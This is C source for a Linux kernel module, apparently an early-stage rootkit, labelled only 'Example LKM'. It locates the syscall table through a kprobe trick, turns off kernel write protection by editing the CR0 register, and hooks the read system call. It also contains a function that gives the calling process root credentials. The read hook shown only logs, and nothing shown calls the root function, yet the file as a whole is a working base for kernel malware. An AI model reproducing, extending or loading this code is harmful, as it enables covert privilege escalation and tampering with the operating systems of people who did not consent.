#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/proc_ns.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/fdtable.h>
#include <linux/kprobes.h>
#include <linux/kernel.h>

MODULE_AUTHOR("B1TC0R3");
MODULE_DESCRIPTION("Example LKM");
MODULE_LICENSE("GPL");

#define KPROBE_LOOKUP 1
#define DEBUG

int get_system(void);
unsigned long* get_syscall_table(void);
void set_page_permissions(unsigned long value);
asmlinkage ssize_t hooked_read(unsigned int filedes, char* buf, size_t nbytes);

typedef unsigned long (*kln_func_t)(const char*);
typedef asmlinkage ssize_t (*real_sys_read_t)(unsigned int, char*, size_t);

real_sys_read_t real_sys_read;
unsigned long* syscall_table;
unsigned long cr0;
extern unsigned long __force_order;

static struct kprobe kln_probe = {
    .symbol_name = "kallsyms_lookup_name"
};

int get_system(void) {
    struct task_struct *current_task = get_current();
    struct cred* credentials = prepare_creds();
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    if (current_task == NULL || credentials == NULL) {
        return -1;
    }

    credentials->uid   = kuid;
    credentials->euid  = kuid;
    credentials->suid  = kuid;
    credentials->fsuid = kuid;

    credentials->gid   = kgid;
    credentials->egid  = kgid;
    credentials->sgid  = kgid;
    credentials->fsgid = kgid;

    commit_creds(credentials);
    return 0;
}

unsigned long* get_syscall_table(void) {
    unsigned long* syscall_table;

    register_kprobe(&kln_probe);
    kln_func_t kallsyms_lookup_name = (kln_func_t) kln_probe.addr;
    unregister_kprobe(&kln_probe);

    syscall_table = (unsigned long*) kallsyms_lookup_name("sys_call_table");

    return syscall_table;
}

void set_page_permissions(unsigned long value) {
    asm volatile(
        "mov %0,%%cr0":"+r"(value),"+m"(__force_order)
    );
}

asmlinkage ssize_t hooked_read(unsigned int filedes, char* buf, size_t nbytes) {
    #ifdef DEBUG
    printk(KERN_INFO "%s: Intercepted read from", THIS_MODULE->name);
    #endif

    return real_sys_read(filedes, buf, nbytes);
}

static int __init ophicordys_init(void) {
    #ifdef DEBUG
    int pid = task_pid_nr(current);
    printk(KERN_INFO "%s: module loaded (PID: %i).\n", THIS_MODULE->name, pid);
    #endif

    syscall_table = get_syscall_table();
    if (syscall_table == NULL)
        return -1;

    #ifdef DEBUG
    printk(KERN_INFO "%s: syscall table located at: %lx\n", THIS_MODULE->name, *syscall_table);
    printk(KERN_INFO "%s: read located at: %lx+%x\n", THIS_MODULE->name, *syscall_table, __NR_read);
    #endif

    real_sys_read = (typeof(ksys_read)*) syscall_table[__NR_read];

    cr0 = read_cr0();
    set_page_permissions(cr0 & ~0x00010000);
    syscall_table[__NR_read] = (unsigned long) hooked_read;
    set_page_permissions(cr0);

    #ifdef DEBUG
    printk(KERN_INFO "%s: Hooked sys_read.\n", THIS_MODULE->name);
    #endif

    return 0;
}

static void __exit ophicordys_exit(void) {
    #ifdef DEBUG
    printk(KERN_INFO "%s: module unloaded.\n", THIS_MODULE->name);
    #endif

    set_page_permissions(cr0 & ~0x00010000);
    syscall_table[__NR_read] = (unsigned long) real_sys_read;
    set_page_permissions(cr0);
}

module_init(ophicordys_init);
module_exit(ophicordys_exit);
